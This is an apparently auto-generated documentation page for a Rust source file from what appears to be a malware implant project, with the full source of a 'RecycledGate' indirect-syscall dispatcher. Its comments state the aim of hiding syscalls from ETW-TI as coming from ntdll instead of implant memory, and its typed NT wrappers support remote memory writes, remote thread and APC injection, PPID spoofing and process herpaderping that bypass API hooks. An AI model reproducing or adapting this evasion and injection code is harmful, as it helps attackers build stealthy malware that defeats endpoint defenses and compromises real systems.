# crowd — recycled.rs  (⚡ GOD TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/recycled.rs` |
| **Lines** | 793 |
| **Tier** | S |
| **Cards** | T001-recycled-gate |
| **Role** | RecycledGate wrappers for NT APIs |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 48 |

## Purpose

# crowd — recycled.rs  (⚡ GOD TIER)

RecycledGate dispatcher: JMP into the `0F 05 C3` gadget inside ntdll.
The SYSCALL instruction executes from ntdll's own .text section.
ETW-TI sees the kernel transition as originating from ntdll, not from
private implant memory.

Verbatim from killaofking/crates/core/src/sys_recycled.rs.
Extended with the typed NT wrappers from sys_indirect::nt.

## Public API

### `recycled1` `unsafe` (line 21)
```rust
pub unsafe fn recycled1(ssn: u32, gadget: usize, a1: usize) -> i32
```

### `recycled2` `unsafe` (line 38)
```rust
pub unsafe fn recycled2(ssn: u32, gadget: usize, a1: usize, a2: usize) -> i32
```

### `recycled3` `unsafe` (line 56)
```rust
pub unsafe fn recycled3(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize) -> i32
```

### `recycled4` `unsafe` (line 75)
```rust
pub unsafe fn recycled4(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> i32
```

### `recycled5` `unsafe` (line 95)
```rust
pub unsafe fn recycled5(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32
```

### `recycled6` `unsafe` (line 117)
```rust
pub unsafe fn recycled6(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> i32
```

### `recycled7` `unsafe` (line 141)
```rust
pub unsafe fn recycled7(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize) -> i32
```

### `recycled8` `unsafe` (line 168)
```rust
pub unsafe fn recycled8(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize) -> i32
```

### `recycled9` `unsafe` (line 197)
```rust
pub unsafe fn recycled9(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize) -> i32
```

### `recycled10` `unsafe` (line 228)
```rust
pub unsafe fn recycled10(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize) -> i32
```

### `recycled11` `unsafe` (line 261)
```rust
pub unsafe fn recycled11(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize, a11: usize) -> i32
```

### `invoke` `unsafe` (line 299)
```rust
pub unsafe fn invoke(hash: u32, arg_count: usize, args: &[usize]) -> i32
```

### `nt_allocate_virtual_memory` `unsafe` (line 330)
```rust
pub unsafe fn nt_allocate_virtual_memory(
```

### `nt_free_virtual_memory` `unsafe` (line 349)
```rust
pub unsafe fn nt_free_virtual_memory(
```

### `nt_write_virtual_memory` `unsafe` (line 364)
```rust
pub unsafe fn nt_write_virtual_memory(
```

### `nt_read_virtual_memory` `unsafe` (line 375)
```rust
pub unsafe fn nt_read_virtual_memory(
```

### `nt_protect_virtual_memory` `unsafe` (line 386)
```rust
pub unsafe fn nt_protect_virtual_memory(
```

### `nt_create_section` `unsafe` (line 403)
```rust
pub unsafe fn nt_create_section(
```

### `nt_map_view_of_section` `unsafe` (line 424)
```rust
pub unsafe fn nt_map_view_of_section(
```

### `nt_unmap_view_of_section` `unsafe` (line 451)
```rust
pub unsafe fn nt_unmap_view_of_section(process_handle: usize, base_address: *mut c_void) -> i32
```

### `nt_create_thread_ex` `unsafe` (line 456)
```rust
pub unsafe fn nt_create_thread_ex(
```

### `nt_queue_apc_thread` `unsafe` (line 485)
```rust
pub unsafe fn nt_queue_apc_thread(
```

### `nt_resume_thread` `unsafe` (line 502)
```rust
pub unsafe fn nt_resume_thread(thread_handle: usize, previous_count: *mut u32) -> i32
```

### `nt_suspend_thread` `unsafe` (line 506)
```rust
pub unsafe fn nt_suspend_thread(thread_handle: usize, previous_count: *mut u32) -> i32
```

### `nt_get_context_thread` `unsafe` (line 510)
```rust
pub unsafe fn nt_get_context_thread(thread_handle: usize, ctx: *mut c_void) -> i32
```

### `nt_set_context_thread` `unsafe` (line 514)
```rust
pub unsafe fn nt_set_context_thread(thread_handle: usize, ctx: *mut c_void) -> i32
```

### `nt_open_process` `unsafe` (line 518)
```rust
pub unsafe fn nt_open_process(
```

### `nt_query_information_process` `unsafe` (line 533)
```rust
pub unsafe fn nt_query_information_process(
```

### `nt_close` `unsafe` (line 544)
```rust
pub unsafe fn nt_close(handle: usize) -> i32
```

### `nt_delay_execution` `unsafe` (line 548)
```rust
pub unsafe fn nt_delay_execution(alertable: bool, interval: *const i64) -> i32
```

### `nt_duplicate_object` `unsafe` (line 552)
```rust
pub unsafe fn nt_duplicate_object(
```

### `nt_query_object` `unsafe` (line 563)
```rust
pub unsafe fn nt_query_object(
```

### `nt_set_information_worker_factory` `unsafe` (line 572)
```rust
pub unsafe fn nt_set_information_worker_factory(
```

### `nt_release_worker_factory_worker` `unsafe` (line 580)
```rust
pub unsafe fn nt_release_worker_factory_worker(handle: usize) -> i32
```

### `nt_set_ea_file` `unsafe` (line 584)
```rust
pub unsafe fn nt_set_ea_file(
```

### `nt_query_ea_file` `unsafe` (line 592)
```rust
pub unsafe fn nt_query_ea_file(
```

### `nt_set_security_object` `unsafe` (line 604)
```rust
pub unsafe fn nt_set_security_object(
```

### `nt_open_file` `unsafe` (line 612)
```rust
pub unsafe fn nt_open_file(
```

### `nt_create_user_process` `unsafe` (line 625)
```rust
pub unsafe fn nt_create_user_process(
```
NtCreateUserProcess — PPID spoofing via direct syscall (bypasses CreateProcessW hooks).

### `nt_query_system_information` `unsafe` (line 655)
```rust
pub unsafe fn nt_query_system_information(
```
NtQuerySystemInformation

### `nt_write_file` `unsafe` (line 665)
```rust
pub unsafe fn nt_write_file(
```
NtWriteFile — write data to a file handle via direct syscall.
Used by herpaderping to overwrite the PE file with decoy content.

### `nt_set_information_file` `unsafe` (line 691)
```rust
pub unsafe fn nt_set_information_file(
```
NtSetInformationFile — set file position/size/attributes via syscall.
Used to reset file pointer and truncate files.

### `nt_flush_buffers_file` `unsafe` (line 708)
```rust
pub unsafe fn nt_flush_buffers_file(
```
NtFlushBuffersFile — flush file buffers via syscall.

### `nt_create_process_ex` `unsafe` (line 720)
```rust
pub unsafe fn nt_create_process_ex(
```
NtCreateProcessEx — create a process from an existing section handle.
Core syscall for herpaderping: section-backed process creation bypasses
CreateProcess hooks and allows file overwrite before thread creation.

### `nt_create_event` `unsafe` (line 748)
```rust
pub unsafe fn nt_create_event(
```
NtCreateEvent — creates a kernel event object.
event_type: 0=NotificationEvent (manual reset), 1=SynchronizationEvent (auto reset)

### `nt_set_event` `unsafe` (line 765)
```rust
pub unsafe fn nt_set_event(event_handle: usize, previous_state: *mut i32) -> i32
```
NtSetEvent — signal an event, optionally returning previous state.

### `nt_wait_for_single_object` `unsafe` (line 774)
```rust
pub unsafe fn nt_wait_for_single_object(
```
NtWaitForSingleObject — wait on a handle with optional timeout.
timeout: *const i64 (100ns intervals, negative = relative). NULL = infinite.

### `nt_terminate_process` `unsafe` (line 787)
```rust
pub unsafe fn nt_terminate_process(process_handle: usize, exit_status: u32) -> i32
```
NtTerminateProcess — terminate a process with given exit code.

## Key Dependencies

- `use core::arch::asm;`

## Full Source

```rust
//! # crowd — recycled.rs  (⚡ GOD TIER)
//!
//! RecycledGate dispatcher: JMP into the `0F 05 C3` gadget inside ntdll.
//! The SYSCALL instruction executes from ntdll's own .text section.
//! ETW-TI sees the kernel transition as originating from ntdll, not from
//! private implant memory.
//!
//! Verbatim from killaofking/crates/core/src/sys_recycled.rs.
//! Extended with the typed NT wrappers from sys_indirect::nt.

#![allow(dead_code)]

use core::arch::asm;

// ──────────────────────────────────────────────────────────────────────────────
// Low-level JMP-to-gadget stubs (x86_64)
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled1(ssn: u32, gadget: usize, a1: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x28",
        "call r11",
        "add rsp, 0x28",
        in("r10")  a1,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled2(ssn: u32, gadget: usize, a1: usize, a2: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x28",
        "call r11",
        "add rsp, 0x28",
        in("r10")  a1,
        in("rdx")  a2,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled3(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x28",
        "call r11",
        "add rsp, 0x28",
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled4(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x28",
        "call r11",
        "add rsp, 0x28",
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled5(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x28",
        "mov [rsp + 0x28], {a5}",
        "call r11",
        "add rsp, 0x28",
        a5 = in(reg) a5,
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled6(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x38",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "call r11",
        "add rsp, 0x38",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled7(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x40",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "call r11",
        "add rsp, 0x40",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn recycled8(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x48",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "call r11",
        "add rsp, 0x48",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn recycled9(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x50",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "mov [rsp + 0x48], {a9}",
        "call r11",
        "add rsp, 0x50",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn recycled10(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x58",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "mov [rsp + 0x48], {a9}",
        "mov [rsp + 0x50], {a10}",
        "call r11",
        "add rsp, 0x58",
        a5  = in(reg) a5,
        a6  = in(reg) a6,
        a7  = in(reg) a7,
        a8  = in(reg) a8,
        a9  = in(reg) a9,
        a10 = in(reg) a10,
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn recycled11(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize, a11: usize) -> i32 {
    let ret: i32;
    asm!(
        "sub rsp, 0x60",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "mov [rsp + 0x48], {a9}",
        "mov [rsp + 0x50], {a10}",
        "mov [rsp + 0x58], {a11}",
        "call r11",
        "add rsp, 0x60",
        a5  = in(reg) a5,
        a6  = in(reg) a6,
        a7  = in(reg) a7,
        a8  = in(reg) a8,
        a9  = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        in("r10")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        in("r11")  gadget,
        lateout("rax") ret,
        lateout("rcx") _,
    );
    ret
}

// ──────────────────────────────────────────────────────────────────────────────
// Dispatcher: hash → (ssn, gadget) → JMP
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn invoke(hash: u32, arg_count: usize, args: &[usize]) -> i32 {
    let &(ssn, gadget) = match crate::syscall_map::syscall_map().get(&hash) {
        Some(v) => v,
        None    => return -1,
    };
    if gadget == 0 {
        return -1;
    }
    let a = |i: usize| -> usize { args.get(i).copied().unwrap_or(0) };
    match arg_count {
        1  => recycled1(ssn, gadget, a(0)),
        2  => recycled2(ssn, gadget, a(0), a(1)),
        3  => recycled3(ssn, gadget, a(0), a(1), a(2)),
        4  => recycled4(ssn, gadget, a(0), a(1), a(2), a(3)),
        5  => recycled5(ssn, gadget, a(0), a(1), a(2), a(3), a(4)),
        6  => recycled6(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5)),
        7  => recycled7(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6)),
        8  => recycled8(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7)),
        9  => recycled9(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8)),
        10 => recycled10(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9)),
        11 => recycled11(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9), a(10)),
        _  => -1,
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Typed NT wrappers
// ──────────────────────────────────────────────────────────────────────────────

use std::ffi::c_void;

pub unsafe fn nt_allocate_virtual_memory(
    process_handle: usize,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> i32 {
    let args = [
        process_handle,
        base_address as usize,
        zero_bits,
        region_size as usize,
        allocation_type as usize,
        protect as usize,
    ];
    invoke(crate::resolve::compute_hash("NtAllocateVirtualMemory"), 6, &args)
}

pub unsafe fn nt_free_virtual_memory(
    process_handle: usize,
    base_address: *mut *mut c_void,
    region_size: *mut usize,
    free_type: u32,
) -> i32 {
    let args = [
        process_handle,
        base_address as usize,
        region_size as usize,
        free_type as usize,
    ];
    invoke(crate::resolve::compute_hash("NtFreeVirtualMemory"), 4, &args)
}

pub unsafe fn nt_write_virtual_memory(
    process: usize,
    base_addr: *mut c_void,
    buffer: *const c_void,
    num_bytes: usize,
    bytes_written: *mut usize,
) -> i32 {
    let args = [process, base_addr as usize, buffer as usize, num_bytes, bytes_written as usize];
    invoke(crate::resolve::compute_hash("NtWriteVirtualMemory"), 5, &args)
}

pub unsafe fn nt_read_virtual_memory(
    process: usize,
    base_addr: *mut c_void,
    buffer: *mut c_void,
    buffer_size: usize,
    bytes_read: *mut usize,
) -> i32 {
    let args = [process, base_addr as usize, buffer as usize, buffer_size, bytes_read as usize];
    invoke(crate::resolve::compute_hash("NtReadVirtualMemory"), 5, &args)
}

pub unsafe fn nt_protect_virtual_memory(
    process: usize,
    base: *mut *mut c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    let args = [
        process,
        base as usize,
        region_size as usize,
        new_protect as usize,
        old_protect as usize,
    ];
    invoke(crate::resolve::compute_hash("NtProtectVirtualMemory"), 5, &args)
}

pub unsafe fn nt_create_section(
    section_handle: *mut usize,
    desired_access: u32,
    object_attributes: *mut c_void,
    maximum_size: *mut u64,
    section_page_protection: u32,
    allocation_attributes: u32,
    file_handle: usize,
) -> i32 {
    let args = [
        section_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        maximum_size as usize,
        section_page_protection as usize,
        allocation_attributes as usize,
        file_handle,
    ];
    invoke(crate::resolve::compute_hash("NtCreateSection"), 7, &args)
}

pub unsafe fn nt_map_view_of_section(
    section_handle: usize,
    process_handle: usize,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    commit_size: usize,
    section_offset: *mut u64,
    view_size: *mut usize,
    inherit_disposition: u32,
    allocation_type: u32,
    win32_protect: u32,
) -> i32 {
    let args = [
        section_handle,
        process_handle,
        base_address as usize,
        zero_bits,
        commit_size,
        section_offset as usize,
        view_size as usize,
        inherit_disposition as usize,
        allocation_type as usize,
        win32_protect as usize,
    ];
    invoke(crate::resolve::compute_hash("NtMapViewOfSection"), 10, &args)
}

pub unsafe fn nt_unmap_view_of_section(process_handle: usize, base_address: *mut c_void) -> i32 {
    let args = [process_handle, base_address as usize];
    invoke(crate::resolve::compute_hash("NtUnmapViewOfSection"), 2, &args)
}

pub unsafe fn nt_create_thread_ex(
    thread_handle: *mut usize,
    desired_access: u32,
    object_attributes: *mut c_void,
    process_handle: usize,
    start_routine: *const c_void,
    argument: *mut c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    maximum_stack_size: usize,
    attribute_list: *mut c_void,
) -> i32 {
    let args = [
        thread_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        process_handle,
        start_routine as usize,
        argument as usize,
        create_flags as usize,
        zero_bits,
        stack_size,
        maximum_stack_size,
        attribute_list as usize,
    ];
    invoke(crate::resolve::compute_hash("NtCreateThreadEx"), 11, &args)
}

pub unsafe fn nt_queue_apc_thread(
    thread_handle: usize,
    apc_routine: *mut c_void,
    apc_arg1: *mut c_void,
    apc_arg2: *mut c_void,
    apc_arg3: usize,
) -> i32 {
    let args = [
        thread_handle,
        apc_routine as usize,
        apc_arg1 as usize,
        apc_arg2 as usize,
        apc_arg3 as usize,
    ];
    invoke(crate::resolve::compute_hash("NtQueueApcThread"), 5, &args)
}

pub unsafe fn nt_resume_thread(thread_handle: usize, previous_count: *mut u32) -> i32 {
    invoke(crate::resolve::compute_hash("NtResumeThread"), 2, &[thread_handle, previous_count as usize])
}

pub unsafe fn nt_suspend_thread(thread_handle: usize, previous_count: *mut u32) -> i32 {
    invoke(crate::resolve::compute_hash("NtSuspendThread"), 2, &[thread_handle, previous_count as usize])
}

pub unsafe fn nt_get_context_thread(thread_handle: usize, ctx: *mut c_void) -> i32 {
    invoke(crate::resolve::compute_hash("NtGetContextThread"), 2, &[thread_handle, ctx as usize])
}

pub unsafe fn nt_set_context_thread(thread_handle: usize, ctx: *mut c_void) -> i32 {
    invoke(crate::resolve::compute_hash("NtSetContextThread"), 2, &[thread_handle, ctx as usize])
}

pub unsafe fn nt_open_process(
    process_handle: *mut usize,
    desired_access: u32,
    object_attributes: *mut c_void,
    client_id: *mut c_void,
) -> i32 {
    let args = [
        process_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        client_id as usize,
    ];
    invoke(crate::resolve::compute_hash("NtOpenProcess"), 4, &args)
}

pub unsafe fn nt_query_information_process(
    process: usize,
    info_class: u32,
    info: *mut u8,
    info_size: u32,
    return_length: *mut u32,
) -> i32 {
    let args = [process, info_class as usize, info as usize, info_size as usize, return_length as usize];
    invoke(crate::resolve::compute_hash("NtQueryInformationProcess"), 5, &args)
}

pub unsafe fn nt_close(handle: usize) -> i32 {
    invoke(crate::resolve::compute_hash("NtClose"), 1, &[handle])
}

pub unsafe fn nt_delay_execution(alertable: bool, interval: *const i64) -> i32 {
    invoke(crate::resolve::compute_hash("NtDelayExecution"), 2, &[alertable as usize, interval as usize])
}

pub unsafe fn nt_duplicate_object(
    src_proc: usize, src_handle: usize,
    dst_proc: usize, dst_handle: *mut usize,
    desired_access: u32, handle_attributes: u32, options: u32,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtDuplicateObject"), 7, &[
        src_proc, src_handle, dst_proc, dst_handle as usize,
        desired_access as usize, handle_attributes as usize, options as usize,
    ])
}

pub unsafe fn nt_query_object(
    handle: usize, obj_info_class: u32,
    buf: *mut u8, len: usize, ret_len: *mut u32,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtQueryObject"), 5, &[
        handle, obj_info_class as usize, buf as usize, len, ret_len as usize,
    ])
}

pub unsafe fn nt_set_information_worker_factory(
    handle: usize, info_class: u32, buf: *const u8, len: usize,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtSetInformationWorkerFactory"), 4, &[
        handle, info_class as usize, buf as usize, len,
    ])
}

pub unsafe fn nt_release_worker_factory_worker(handle: usize) -> i32 {
    invoke(crate::resolve::compute_hash("NtReleaseWorkerFactoryWorker"), 1, &[handle])
}

pub unsafe fn nt_set_ea_file(
    file_handle: usize, io_status: *mut usize, buf: *const u8, len: usize,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtSetEaFile"), 4, &[
        file_handle, io_status as usize, buf as usize, len,
    ])
}

pub unsafe fn nt_query_ea_file(
    file_handle: usize, io_status: *mut usize,
    buf: *mut u8, len: usize,
    single: bool, list: *const u8, list_len: usize,
    index: *const u32, restart: bool,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtQueryEaFile"), 9, &[
        file_handle, io_status as usize, buf as usize, len,
        single as usize, list as usize, list_len, index as usize, restart as usize,
    ])
}

pub unsafe fn nt_set_security_object(
    handle: usize, security_info: u32, security_descriptor: *mut u8,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtSetSecurityObject"), 3, &[
        handle, security_info as usize, security_descriptor as usize,
    ])
}

pub unsafe fn nt_open_file(
    file_handle: *mut usize, desired_access: u32,
    object_attributes: *mut u8, io_status: *mut usize,
    share_access: u32, open_options: u32,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtOpenFile"), 6, &[
        file_handle as usize, desired_access as usize,
        object_attributes as usize, io_status as usize,
        share_access as usize, open_options as usize,
    ])
}

/// NtCreateUserProcess — PPID spoofing via direct syscall (bypasses CreateProcessW hooks).
pub unsafe fn nt_create_user_process(
    process_handle: *mut usize,
    thread_handle: *mut usize,
    process_desired_access: u32,
    thread_desired_access: u32,
    process_object_attributes: *mut c_void,
    thread_object_attributes: *mut c_void,
    process_flags: u32,
    thread_flags: u32,
    process_parameters: *mut c_void,
    create_info: *mut c_void,
    attribute_list: *mut c_void,
) -> i32 {
    let args = [
        process_handle as usize,
        thread_handle as usize,
        process_desired_access as usize,
        thread_desired_access as usize,
        process_object_attributes as usize,
        thread_object_attributes as usize,
        process_flags as usize,
        thread_flags as usize,
        process_parameters as usize,
        create_info as usize,
        attribute_list as usize,
    ];
    invoke(crate::resolve::compute_hash("NtCreateUserProcess"), 11, &args)
}

/// NtQuerySystemInformation
pub unsafe fn nt_query_system_information(
    class: u32, buf: *mut u8, len: usize, ret_len: *mut u32,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtQuerySystemInformation"), 4, &[
        class as usize, buf as usize, len, ret_len as usize,
    ])
}

/// NtWriteFile — write data to a file handle via direct syscall.
/// Used by herpaderping to overwrite the PE file with decoy content.
pub unsafe fn nt_write_file(
    file_handle: usize,
    event: usize,
    apc_routine: *mut c_void,
    apc_context: *mut c_void,
    io_status: *mut usize,
    buffer: *const c_void,
    length: u32,
    byte_offset: *mut u64,
    key: *mut u32,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtWriteFile"), 9, &[
        file_handle,
        event,
        apc_routine as usize,
        apc_context as usize,
        io_status as usize,
        buffer as usize,
        length as usize,
        byte_offset as usize,
        key as usize,
    ])
}

/// NtSetInformationFile — set file position/size/attributes via syscall.
/// Used to reset file pointer and truncate files.
pub unsafe fn nt_set_information_file(
    file_handle: usize,
    io_status: *mut usize,
    file_info: *const c_void,
    length: u32,
    file_info_class: u32,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtSetInformationFile"), 5, &[
        file_handle,
        io_status as usize,
        file_info as usize,
        length as usize,
        file_info_class as usize,
    ])
}

/// NtFlushBuffersFile — flush file buffers via syscall.
pub unsafe fn nt_flush_buffers_file(
    file_handle: usize,
    io_status: *mut usize,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtFlushBuffersFile"), 2, &[
        file_handle, io_status as usize,
    ])
}

/// NtCreateProcessEx — create a process from an existing section handle.
/// Core syscall for herpaderping: section-backed process creation bypasses
/// CreateProcess hooks and allows file overwrite before thread creation.
pub unsafe fn nt_create_process_ex(
    process_handle: *mut usize,
    desired_access: u32,
    object_attributes: *mut c_void,
    parent_process: usize,
    flags: u32,
    section_handle: usize,
    debug_port: usize,
    exception_port: usize,
    job_member_level: u32,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtCreateProcessEx"), 9, &[
        process_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        parent_process,
        flags as usize,
        section_handle,
        debug_port,
        exception_port,
        job_member_level as usize,
    ])
}

// ── NT Event wrappers (for proxy_dll.rs synchronization) ────────────────

/// NtCreateEvent — creates a kernel event object.
/// event_type: 0=NotificationEvent (manual reset), 1=SynchronizationEvent (auto reset)
pub unsafe fn nt_create_event(
    event_handle: *mut usize,
    desired_access: u32,
    object_attributes: *mut c_void,
    event_type: u32,
    initial_state: i32,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtCreateEvent"), 5, &[
        event_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        event_type as usize,
        initial_state as usize,
    ])
}

/// NtSetEvent — signal an event, optionally returning previous state.
pub unsafe fn nt_set_event(event_handle: usize, previous_state: *mut i32) -> i32 {
    invoke(crate::resolve::compute_hash("NtSetEvent"), 2, &[
        event_handle,
        previous_state as usize,
    ])
}

/// NtWaitForSingleObject — wait on a handle with optional timeout.
/// timeout: *const i64 (100ns intervals, negative = relative). NULL = infinite.
pub unsafe fn nt_wait_for_single_object(
    handle: usize,
    alertable: bool,
    timeout: *const i64,
) -> i32 {
    invoke(crate::resolve::compute_hash("NtWaitForSingleObject"), 3, &[
        handle,
        alertable as usize,
        timeout as usize,
    ])
}

/// NtTerminateProcess — terminate a process with given exit code.
pub unsafe fn nt_terminate_process(process_handle: usize, exit_status: u32) -> i32 {
    invoke(crate::resolve::compute_hash("NtTerminateProcess"), 2, &[
        process_handle,
        exit_status as usize,
    ])
}


```